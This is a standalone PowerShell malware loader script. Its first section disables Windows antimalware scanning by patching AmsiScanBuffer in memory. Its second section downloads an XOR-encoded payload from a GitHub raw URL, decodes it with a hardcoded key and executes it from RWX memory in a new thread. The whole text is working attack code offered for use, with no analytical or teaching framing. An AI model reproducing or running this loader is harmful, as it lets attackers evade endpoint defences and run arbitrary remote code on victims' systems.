# --- AMSI Bypass ---
try {
    $Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
    Add-Type $Win32
    $h = [Win32]::LoadLibrary("amsi.dll")
    $p = [Win32]::GetProcAddress($h, "AmsiScanBuffer")
    $old = 0
    [Win32]::VirtualProtect($p, [uintptr]6, 0x40, [ref]$old)
    # Patch for x86: xor eax, eax; ret -> 0x31, 0xC0, 0xC3
    $patch = [byte[]](0x31, 0xC0, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $p, 3)
} catch {}

# --- Loader Execution Logic ---
$code = @"
using System;
using System.Runtime.InteropServices;
public class Executor {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type $code

# 1. Download the XOR'd loader
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$xoredBytes = $wc.DownloadData("https://raw.githubusercontent.com/lucid251/HGJFJTKH24/main/stage.xor") # Placeholder for loader URL

# 2. De-XOR the loader in memory
$key = [System.Text.Encoding]::ASCII.GetBytes("i0xuFnZOf69X7bktf3Vs") # Placeholder for XOR key
$decryptedBytes = New-Object byte[] $xoredBytes.Length
for ($i = 0; $i -lt $xoredBytes.Length; $i++) {
    $decryptedBytes[$i] = $xoredBytes[$i] -bxor $key[$i % $key.Length]
}

# 3. Allocate executable memory
$mem = [Executor]::VirtualAlloc(0, $decryptedBytes.Length, 0x3000, 0x40)

# 4. Copy the loader into memory
[System.Runtime.InteropServices.Marshal]::Copy($decryptedBytes, 0, $mem, $decryptedBytes.Length)

# 5. Execute the loader in a new thread
$threadId = 0
$hThread = [Executor]::CreateThread(0, 0, $mem, 0, 0, [ref]$threadId)
[Executor]::WaitForSingleObject($hThread, 0xFFFFFFFF)
